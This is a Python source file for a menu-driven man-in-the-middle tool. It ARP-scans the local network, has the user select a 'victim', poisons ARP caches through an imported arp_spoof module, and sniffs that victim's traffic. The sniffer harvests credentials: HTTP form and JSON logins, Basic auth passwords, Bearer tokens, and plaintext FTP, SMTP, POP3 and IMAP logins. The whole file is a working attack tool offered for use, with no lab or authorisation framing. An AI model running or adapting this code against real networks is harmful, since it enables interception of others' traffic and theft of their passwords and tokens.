import time
import os
import socket
import ipaddress
import threading
import shutil
import subprocess
from colorama import Fore, Style, init as colorama_init
import psutil

# Initialize colorama for Windows support
colorama_init(autoreset=False)

# Try to import scapy, offer installation if missing
try:
    from scapy.all import (sniff as scapy_sniff, srp, ARP, Ether, Raw, conf,
                            DNS, DNSQR, IP, TCP, UDP, sendp)
    from scapy.layers import http
except ImportError:
    def offer_install_scapy() -> None:
        """Prompt the user to install Scapy via apt or pip when missing."""
        print(f"{Fore.YELLOW}[!] Scapy is not installed.{Style.RESET_ALL}")
        apt_path = shutil.which('apt')
        pip_path = shutil.which('pip') or shutil.which('pip3')

        if apt_path and os.name != 'nt':
            answer = input("[*] Install Scapy now using 'sudo apt install scapy'? (Y/N): ").strip().lower()
            if answer == 'y':
                try:
                    subprocess.run(['sudo', 'apt', 'update'], check=True)
                    subprocess.run(['sudo', 'apt', 'install', '-y', 'scapy'], check=True)
                except subprocess.CalledProcessError as e:
                    print(f"{Fore.RED}[!] apt install failed: {e}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}[+] scapy installed via apt. Please re-run this tool.{Style.RESET_ALL}")
                    return
        if pip_path:
            answer = input("[*] Install Scapy now using 'pip install scapy'? (Y/N): ").strip().lower()
            if answer == 'y':
                try:
                    subprocess.run([pip_path, 'install', 'scapy'], check=True)
                except subprocess.CalledProcessError as e:
                    print(f"{Fore.RED}[!] pip install failed: {e}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}[+] scapy installed via pip. Please re-run this tool.{Style.RESET_ALL}")
                    return

        print(f"{Fore.YELLOW}[!] Scapy is required to run the network scanner/sniffer. Install it and re-run the tool.{Style.RESET_ALL}")

    offer_install_scapy()
    raise SystemExit(1)

from prettytable import PrettyTable

# Import ARP spoof module
from arp_spoof import main_arp_spoof, stop_arp_spoof_background, is_arp_spoof_active

# Last scanned / selected victim IP (set when scanner stops and user enters a value)
last_victim_ip: str | None = None

# Warn if Scapy's pcap provider is not available
try:
    if not conf.use_pcap:
        print(f"{Fore.YELLOW}[!] No libpcap provider detected. Install Npcap (Windows) or libpcap (Linux) for best results.{Style.RESET_ALL}")
except Exception:
    pass


# ---------------------------------------------------------------------------
# Logging helpers — consistent with arp_spoof.py
# ---------------------------------------------------------------------------

def _info(msg: str) -> None:
    print(f"{Fore.BLUE}[*]{Style.RESET_ALL} {msg}")

def _ok(msg: str) -> None:
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")

def _warn(msg: str) -> None:
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")

def _err(msg: str) -> None:
    print(f"{Fore.RED}[!]{Style.RESET_ALL} {msg}")


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def get_current_mac(interface: str) -> str | None:
    """Return the MAC address for *interface*, or None if not found."""
    try:
        addrs = psutil.net_if_addrs()
        if interface in addrs:
            for addr in addrs[interface]:
                if addr.family == psutil.AF_LINK:
                    return addr.address
    except Exception as e:
        _err(f"Could not get MAC for {interface}: {e}")
    return None


def get_current_ip(interface: str) -> str | None:
    """Return the IPv4 address for *interface*, or None if not found."""
    try:
        addrs = psutil.net_if_addrs()
        if interface in addrs:
            for addr in addrs[interface]:
                if addr.family == socket.AF_INET:
                    return addr.address
    except Exception as e:
        _err(f"Could not get IP for {interface}: {e}")
    return None


def get_interface_network(interface: str) -> tuple[str, str] | None:
    """Return (ip, netmask) for *interface*, or None if unavailable."""
    try:
        addrs = psutil.net_if_addrs()
        if interface in addrs:
            for addr in addrs[interface]:
                if addr.family == socket.AF_INET:
                    return addr.address, addr.netmask
    except Exception as e:
        _err(f"Could not get network for {interface}: {e}")
    return None


def check_privileges() -> bool:
    """Return True if running with sufficient privileges for raw sockets.

    On Unix this means uid 0. On Windows, return True (Npcap handles it).
    """
    if os.name == 'nt':
        return True
    try:
        return os.geteuid() == 0
    except AttributeError:
        return True


# ---------------------------------------------------------------------------
# Network scanning
# ---------------------------------------------------------------------------

def scan_network_once(interface: str) -> set[tuple[str, str]] | None:
    """Run a single ARP scan on *interface* and return discovered devices.

    Returns a set of (ip, mac) tuples, or None on failure.
    """
    net = get_interface_network(interface)
    if not net:
        _err(f"Could not determine network for {interface}")
        return None
    ip, netmask = net
    try:
        network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
    except Exception as e:
        _err(f"Invalid network for {interface}: {e}")
        return None

    subnet = str(network)
    _info(f"Scanning {subnet} on {interface}...")

    arp = ARP(pdst=subnet)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    try:
        answered, _ = srp(packet, iface=interface, timeout=2, verbose=False)
    except PermissionError:
        _err("Permission denied — run as root or with Npcap on Windows")
        return None
    except Exception as e:
        _err(f"ARP scan failed: {e}")
        return None

    devices: set[tuple[str, str]] = set()
    for sent, received in answered:
        devices.add((received.psrc, received.hwsrc))

    return devices


def ip_table() -> None:
    """Print a table of all network interfaces with their MAC and IP."""
    addrs = psutil.net_if_addrs()
    netmasks = {}
    for interface in addrs:
        for addr in addrs[interface]:
            if addr.family == socket.AF_INET:
                netmasks[interface] = addr.netmask

    t = PrettyTable([
        f'{Fore.GREEN}Interface',
        'MAC Address',
        f'IP Address{Style.RESET_ALL}'
    ])
    for interface in addrs:
        mac = get_current_mac(interface)
        ip = get_current_ip(interface)
        if ip and mac:
            t.add_row([interface, mac, ip])
        elif mac:
            t.add_row([interface, mac, f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
        elif ip:
            t.add_row([interface, f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}", ip])
    print(t)


def choose_interface() -> str | None:
    """Present a numbered list of interfaces and return the selected name."""
    addrs = psutil.net_if_addrs()
    interfaces = list(addrs.keys())
    if not interfaces:
        _err("No network interfaces found")
        return None

    print(f"\n{Fore.CYAN}Available interfaces:{Style.RESET_ALL}")
    for idx, iface in enumerate(interfaces, start=1):
        ip = get_current_ip(iface) or "-"
        mac = get_current_mac(iface) or "-"
        print(f"  {Fore.GREEN}{idx}{Style.RESET_ALL}) {iface}  IP: {ip}  MAC: {mac}")

    try:
        choice = input(f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Select interface by number: ").strip()
        if not choice:
            return None
        i = int(choice) - 1
        if 0 <= i < len(interfaces):
            return interfaces[i]
        _err("Invalid selection.")
    except (ValueError, KeyboardInterrupt):
        _err("Invalid selection or cancelled.")
    return None


# ---------------------------------------------------------------------------
# Packet sniffing
# ---------------------------------------------------------------------------

def start_sniff(interface: str, show_raw: bool, victim_ip: str | None = None) -> None:
    """Start sniffing on *interface*. Optionally filter to *victim_ip* only."""
    bpf_filter = f"host {victim_ip}" if victim_ip else None
    sniff_kwargs: dict = dict(
        iface=interface,
        store=False,
        prn=lambda pkt: process_sniffed_packet(pkt, show_raw),
    )
    if bpf_filter:
        sniff_kwargs["filter"] = bpf_filter
    scapy_sniff(**sniff_kwargs)


def process_sniffed_packet(packet, show_raw: bool) -> None:
    """Callback invoked for every captured packet."""
    # --- DNS queries ---
    if packet.haslayer(DNS) and packet.haslayer(DNSQR):
        dns_layer = packet[DNS]
        if dns_layer.qr == 0:
            domain = packet[DNSQR].qname.decode(errors='ignore').rstrip('.')
            src = packet[IP].src if packet.haslayer(IP) else '?'
            print(f"{Fore.CYAN}[DNS] {src} -> {domain}{Style.RESET_ALL}")

    # --- HTTP requests ---
    if packet.haslayer(http.HTTPRequest):
        print(f"{Fore.BLUE}[+] HTTP REQUEST >>>>>{Style.RESET_ALL}")
        url_extractor(packet)

        # Structured credential extraction (form data, JSON, auth headers)
        harvest_credentials(packet)

        # Fallback: raw keyword match for anything the structured parser missed
        login_data = get_login_info(packet)
        if login_data:
            print(f"{Fore.GREEN}[+] Possible credentials >>> {login_data}{Style.RESET_ALL}")

        if show_raw:
            raw_http_request(packet)

    # --- Plaintext protocol credentials (FTP, SMTP, POP3, IMAP) ---
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        harvest_plaintext_creds(packet)

    # --- TCP SYN (only when show_raw is enabled) ---
    if show_raw and packet.haslayer(TCP):
        tcp = packet[TCP]
        if tcp.flags == 'S' and packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
            dport = tcp.dport
            print(f"{Fore.YELLOW}[TCP] {src} -> {dst}:{dport} (SYN){Style.RESET_ALL}")


def get_login_info(packet) -> str | None:
    """Check the raw payload for common credential-related keywords."""
    if packet.haslayer(Raw):
        load = packet[Raw].load
        load_decode = load.decode('utf-8', errors='ignore')
        keywords = ["username", "user", "email", "pass", "login", "password",
                     "UserName", "Password"]
        for keyword in keywords:
            if keyword in load_decode:
                return load_decode
    return None


# ---------------------------------------------------------------------------
# Credential harvesting — structured extraction from captured packets
# ---------------------------------------------------------------------------

# Field names commonly used in login/signup forms (case-insensitive match)
_USERNAME_FIELDS = {
    "username", "user", "login", "user_name", "user_login", "nick",
    "nickname", "uname", "usr", "accountname", "account",
}
_EMAIL_FIELDS = {
    "email", "mail", "e-mail", "emailaddress", "email_address",
    "user_email", "useremail",
}
_PASSWORD_FIELDS = {
    "password", "pass", "passwd", "pwd", "user_password", "userpassword",
    "pass_word", "secret", "passphrase",
}


def _parse_form_data(body: str) -> dict[str, str]:
    """Parse a URL-encoded form body (key=val&key=val) into a dict."""
    from urllib.parse import unquote_plus
    pairs: dict[str, str] = {}
    for part in body.split('&'):
        if '=' in part:
            k, v = part.split('=', 1)
            pairs[unquote_plus(k)] = unquote_plus(v)
    return pairs


def _parse_json_data(body: str) -> dict | None:
    """Try to parse *body* as JSON; return dict or None."""
    import json
    body = body.strip()
    if not body.startswith('{'):
        return None
    try:
        data = json.loads(body)
        if isinstance(data, dict):
            return data
    except (json.JSONDecodeError, ValueError):
        pass
    return None


def _extract_credentials(fields: dict[str, str]) -> dict[str, str]:
    """Pull username, email, and password values from a dict of form/JSON fields."""
    creds: dict[str, str] = {}
    for key, value in fields.items():
        key_lower = key.lower().strip()
        if not value or not value.strip():
            continue
        if key_lower in _USERNAME_FIELDS:
            creds["username"] = value
        elif key_lower in _EMAIL_FIELDS:
            creds["email"] = value
        elif key_lower in _PASSWORD_FIELDS:
            creds["password"] = value
    return creds


def _format_credentials(creds: dict[str, str], source: str) -> str:
    """Format extracted credentials for display."""
    parts = []
    if "username" in creds:
        parts.append(f"User: {Fore.WHITE}{creds['username']}{Fore.GREEN}")
    if "email" in creds:
        parts.append(f"Email: {Fore.WHITE}{creds['email']}{Fore.GREEN}")
    if "password" in creds:
        parts.append(f"Pass: {Fore.RED}{creds['password']}{Fore.GREEN}")
    if not parts:
        return ""
    return f"{Fore.GREEN}[CREDS {source}] {' | '.join(parts)}{Style.RESET_ALL}"


def harvest_credentials(packet) -> None:
    """Extract and display login/signup credentials from a captured packet.

    Checks for:
    - URL-encoded POST form data (application/x-www-form-urlencoded)
    - JSON POST bodies ({email: ..., password: ...})
    - HTTP Basic / Bearer Authorization headers
    """
    if not packet.haslayer(Raw):
        return

    load = packet[Raw].load.decode('utf-8', errors='ignore')
    src_ip = packet[IP].src if packet.haslayer(IP) else '?'

    # --- 1. URL-encoded form data (most common for HTTP login forms) ---
    if '=' in load and '&' in load:
        fields = _parse_form_data(load)
        creds = _extract_credentials(fields)
        if creds:
            print(_format_credentials(creds, f"HTTP Form | {src_ip}"))
            return

    # --- 2. JSON login payloads ---
    json_data = _parse_json_data(load)
    if json_data:
        str_fields = {k: str(v) for k, v in json_data.items() if v is not None}
        creds = _extract_credentials(str_fields)
        if creds:
            print(_format_credentials(creds, f"JSON API | {src_ip}"))
            return

    # --- 3. HTTP Authorization header (Basic / Bearer) ---
    if packet.haslayer(http.HTTPRequest):
        http_layer = packet[http.HTTPRequest]
        auth = None
        if hasattr(http_layer, 'Authorization') and http_layer.Authorization:
            auth = http_layer.Authorization
            if isinstance(auth, bytes):
                auth = auth.decode('utf-8', errors='ignore')

        if auth:
            if auth.lower().startswith('basic '):
                import base64
                try:
                    decoded = base64.b64decode(auth[6:]).decode('utf-8', errors='ignore')
                    if ':' in decoded:
                        user, passwd = decoded.split(':', 1)
                        print(f"{Fore.GREEN}[CREDS HTTP Basic | {src_ip}] "
                              f"User: {Fore.WHITE}{user}{Fore.GREEN} | "
                              f"Pass: {Fore.RED}{passwd}{Style.RESET_ALL}")
                        return
                except Exception:
                    pass
            elif auth.lower().startswith('bearer '):
                token = auth[7:].strip()
                print(f"{Fore.GREEN}[CREDS Bearer Token | {src_ip}] "
                      f"Token: {Fore.WHITE}{token[:40]}{'...' if len(token) > 40 else ''}"
                      f"{Style.RESET_ALL}")
                return


def harvest_plaintext_creds(packet) -> None:
    """Detect plaintext credentials in FTP, SMTP, POP3, and IMAP traffic."""
    if not packet.haslayer(TCP) or not packet.haslayer(Raw) or not packet.haslayer(IP):
        return

    tcp = packet[TCP]
    load = packet[Raw].load.decode('utf-8', errors='ignore').strip()
    src = packet[IP].src
    dport = tcp.dport

    # FTP (port 21)
    if dport == 21:
        if load.upper().startswith('USER '):
            print(f"{Fore.GREEN}[CREDS FTP | {src}] User: {Fore.WHITE}{load[5:]}{Style.RESET_ALL}")
        elif load.upper().startswith('PASS '):
            print(f"{Fore.GREEN}[CREDS FTP | {src}] Pass: {Fore.RED}{load[5:]}{Style.RESET_ALL}")

    # SMTP (port 25, 587)
    elif dport in (25, 587):
        if load.upper().startswith('AUTH LOGIN') or load.upper().startswith('AUTH PLAIN'):
            print(f"{Fore.GREEN}[CREDS SMTP Auth | {src}] {Fore.WHITE}{load}{Style.RESET_ALL}")

    # POP3 (port 110)
    elif dport == 110:
        if load.upper().startswith('USER '):
            print(f"{Fore.GREEN}[CREDS POP3 | {src}] User: {Fore.WHITE}{load[5:]}{Style.RESET_ALL}")
        elif load.upper().startswith('PASS '):
            print(f"{Fore.GREEN}[CREDS POP3 | {src}] Pass: {Fore.RED}{load[5:]}{Style.RESET_ALL}")

    # IMAP (port 143)
    elif dport == 143:
        if ' LOGIN ' in load.upper():
            print(f"{Fore.GREEN}[CREDS IMAP | {src}] {Fore.WHITE}{load}{Style.RESET_ALL}")


def url_extractor(packet) -> None:
    """Print the source IP, HTTP method, host and path from a packet."""
    http_raw = packet.getlayer('HTTPRequest')
    ip_raw = packet.getlayer('IP')
    if not http_raw or not ip_raw:
        return
    http_layer = http_raw.fields
    ip_layer = ip_raw.fields
    print(
        f"  {ip_layer['src']} requested:\n"
        f"  {http_layer['Method'].decode()} "
        f"{http_layer['Host'].decode()}"
        f"{http_layer['Path'].decode()}"
    )


def raw_http_request(packet) -> None:
    """Pretty-print all fields from the HTTP request layer."""
    httplayer = packet[http.HTTPRequest].fields
    print("----------------- Raw HTTP Packet -------------------")
    print("{:<40} {:<15}".format('Key', 'Label'))
    try:
        for k, v in httplayer.items():
            label = "[binary]"
            try:
                label = v.decode()
            except (UnicodeDecodeError, AttributeError):
                pass
            print("{:<40} {:<15}".format(k, label))
    except KeyboardInterrupt:
        print("\n[+] Quitting...")
    print("-----------------------------------------------------")


# ---------------------------------------------------------------------------
# Packet Sniffer Module entry point
# ---------------------------------------------------------------------------

def _validate_ip(ip_str: str) -> bool:
    """Return True if *ip_str* is a valid IPv4 or IPv6 address."""
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False


def main_sniff() -> None:
    """Run the packet-sniffer module."""
    global last_victim_ip

    print(f"\n{Fore.CYAN}{'='*55}")
    print(f"         Packet Sniffer Module")
    print(f"{'='*55}{Style.RESET_ALL}")

    # Show ARP spoofing status
    if is_arp_spoof_active():
        _ok("ARP spoofing is active — traffic from victim is being captured.")
    else:
        _warn("ARP spoofing is NOT active. Only local traffic will be captured.")
        _info("Use option [1] to start ARP spoofing first for MITM captures.")

    print(f"{Fore.YELLOW}[!] DNS queries are captured (domains visited even over HTTPS)")
    print(f"[!] HTTP credentials are captured from plaintext traffic only{Style.RESET_ALL}")

    # --- Target IP filter ---
    victim_ip = last_victim_ip
    if victim_ip:
        _info(f"Last victim IP: {victim_ip}")
        override = input(f"{Fore.BLUE}[*]{Style.RESET_ALL} Press Enter to sniff {victim_ip}, or type a new IP: ").strip()
        if override:
            if not _validate_ip(override):
                _err(f"Invalid IP address: {override}")
                return
            victim_ip = override
        else:
            _ok(f"Using victim IP: {victim_ip}")
    else:
        victim_ip_input = input(f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Enter target IP to filter (blank = all traffic): ").strip()
        if victim_ip_input:
            if not _validate_ip(victim_ip_input):
                _err(f"Invalid IP address: {victim_ip_input}")
                return
            victim_ip = victim_ip_input

    # --- Raw mode ---
    try:
        raw_input = input(f"{Fore.BLUE}[*]{Style.RESET_ALL} Show raw packets & TCP connections? (Y/N): ").strip()
        show_raw = raw_input.lower() == "y"

        # --- Interface ---
        ip_table()
        iface_input = input(f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Enter interface name: ").strip()
        if not iface_input:
            _err("No interface provided.")
            return
        interface = iface_input

        # --- Start sniffing ---
        print(f"\n{Fore.CYAN}{'─'*55}")
        if victim_ip:
            print(f"   Sniffing packets for {Fore.GREEN}{victim_ip}{Fore.CYAN} only...")
        else:
            print(f"   Sniffing ALL packets (no filter)...")
        print(f"   Interface: {interface}")
        print(f"   Press Ctrl+C to stop sniffing")
        print(f"{'─'*55}{Style.RESET_ALL}\n")

        start_sniff(interface, show_raw, victim_ip)

    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Sniffing stopped.{Style.RESET_ALL}")
        time.sleep(1)


# ---------------------------------------------------------------------------
# Main Menu
# ---------------------------------------------------------------------------

MENU_BANNER = f"""
{Fore.CYAN}
  ███╗   ██╗███████╗████████╗    ███████╗███╗   ██╗██╗███████╗███████╗███████╗██████╗
  ████╗  ██║██╔════╝╚══██╔══╝    ██╔════╝████╗  ██║██║██╔════╝██╔════╝██╔════╝██╔══██╗
  ██╔██╗ ██║█████╗     ██║       ███████╗██╔██╗ ██║██║█████╗  █████╗  █████╗  ██████╔╝
  ██║╚██╗██║██╔══╝     ██║       ╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗
  ██║ ╚████║███████╗   ██║       ███████║██║ ╚████║██║██║     ██║     ███████╗██║  ██║
  ╚═╝  ╚═══╝╚══════╝   ╚═╝       ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}"""


def print_menu() -> None:
    """Print the main menu options with ARP spoofing status."""
    print(f"\n{Fore.CYAN}{'='*55}{Style.RESET_ALL}")

    # Show ARP spoofing status in the menu header
    if is_arp_spoof_active():
        print(f"  {Fore.GREEN}[*] ARP Spoofing: ACTIVE{Style.RESET_ALL}")
    else:
        print(f"  {Fore.YELLOW}[*] ARP Spoofing: inactive{Style.RESET_ALL}")

    print(f"  {Fore.GREEN}[1]{Style.RESET_ALL}  Start ARP Spoofer  {Fore.YELLOW}(MITM — poison ARP caches){Style.RESET_ALL}")
    print(f"  {Fore.GREEN}[2]{Style.RESET_ALL}  Start Packet Sniffer {Fore.YELLOW}(capture HTTP credentials){Style.RESET_ALL}")
    print(f"  {Fore.GREEN}[3]{Style.RESET_ALL}  Stop ARP Spoofing   {Fore.YELLOW}(restore ARP tables){Style.RESET_ALL}")
    print(f"  {Fore.RED}[4]{Style.RESET_ALL}  Exit")
    print(f"{Fore.CYAN}{'='*55}{Style.RESET_ALL}")


def main() -> None:
    """Application entry point — show menu and dispatch to modules."""
    global last_victim_ip

    print(MENU_BANNER)

    while True:
        print_menu()
        try:
            choice = input(f"\n{Fore.BLUE}[>]{Style.RESET_ALL} Select an option: ").strip()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Exiting...{Style.RESET_ALL}")
            break

        # ------------------------------------------------------------------
        # Option 1: ARP Spoofing
        # ------------------------------------------------------------------
        if choice == "1":
            if is_arp_spoof_active():
                _warn("ARP spoofing is already running. Use [3] to stop it first.")
                continue

            if not check_privileges():
                _warn("You may need elevated privileges for ARP and raw sockets.")

            interface = choose_interface()
            if not interface:
                _err("No interface selected — returning to menu.")
                continue


            # --- Scan network (with rescan loop) ---
            devices_list: list[tuple[str, str]] = []
            while True:
                _info(f"Scanning network on {interface}...")
                devices = scan_network_once(interface)
                if devices:
                    devices_list = sorted(devices)
                    _ok(f"Discovered {len(devices)} device(s):")
                    t = PrettyTable(["#", "IP", "MAC Address"])
                    for idx, (ip_addr, mac) in enumerate(devices_list, start=1):
                        t.add_row([idx, ip_addr, mac])
                    print(t)
                else:
                    _warn("No devices found on network.")

                # --- Pick victim IP or rescan ---
                try:
                    victim_input = input(
                        f"\n{Fore.BLUE}[*]{Style.RESET_ALL} Enter Victim IP or # from table"
                        f" ({Fore.YELLOW}R{Style.RESET_ALL} to rescan): "
                    ).strip()
                except KeyboardInterrupt:
                    print(f"\n{Fore.RED}[!] Cancelled.{Style.RESET_ALL}")
                    victim_input = ""
                    break

                if victim_input.lower() == 'r':
                    continue  # rescan

                break  # proceed with victim selection

            victim_ip: str | None = None
            if victim_input.isdigit() and devices_list:
                idx = int(victim_input) - 1
                if 0 <= idx < len(devices_list):
                    victim_ip = devices_list[idx][0]
                    _ok(f"Selected victim: {victim_ip}")
            elif victim_input:
                if not _validate_ip(victim_input):
                    _err(f"Invalid IP address: {victim_input}")
                    continue
                victim_ip = victim_input

            if not victim_ip:
                _err("No victim IP selected — returning to menu.")
                continue

            last_victim_ip = victim_ip

            # --- Pick gateway IP ---
            try:
                gw_input = input(f"{Fore.BLUE}[*]{Style.RESET_ALL} Enter Gateway IP or # from table (blank = auto-detect): ").strip()
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[!] Cancelled.{Style.RESET_ALL}")
                continue

            gateway_ip: str | None = None
            if gw_input.isdigit() and devices_list:
                idx = int(gw_input) - 1
                if 0 <= idx < len(devices_list):
                    gateway_ip = devices_list[idx][0]
            elif gw_input:
                if not _validate_ip(gw_input):
                    _err(f"Invalid IP address: {gw_input}")
                    continue
                gateway_ip = gw_input

            # --- Start ARP spoofing ---
            spoof_started = main_arp_spoof(target_ip=victim_ip, gateway_ip=gateway_ip)

            if not spoof_started:
                _err("ARP spoofing failed to start.")
                continue

        # ------------------------------------------------------------------
        # Option 2: Packet Sniffer
        # ------------------------------------------------------------------
        elif choice == "2":
            main_sniff()

        # ------------------------------------------------------------------
        # Option 3: Stop ARP Spoofing
        # ------------------------------------------------------------------
        elif choice == "3":
            if not is_arp_spoof_active():
                _warn("ARP spoofing is not currently running.")
                continue

            stop_arp_spoof_background()
            _ok("ARP spoofing has been stopped and ARP tables restored.")

        # ------------------------------------------------------------------
        # Option 4: Exit
        # ------------------------------------------------------------------
        elif choice == "4":
            if is_arp_spoof_active():
                _info("Stopping ARP spoofing before exit...")
                stop_arp_spoof_background()
            print(f"\n{Fore.RED}[!] Goodbye!{Style.RESET_ALL}")
            break

        else:
            _err("Invalid option. Please enter 1, 2, 3, or 4.")


if __name__ == "__main__":
    main()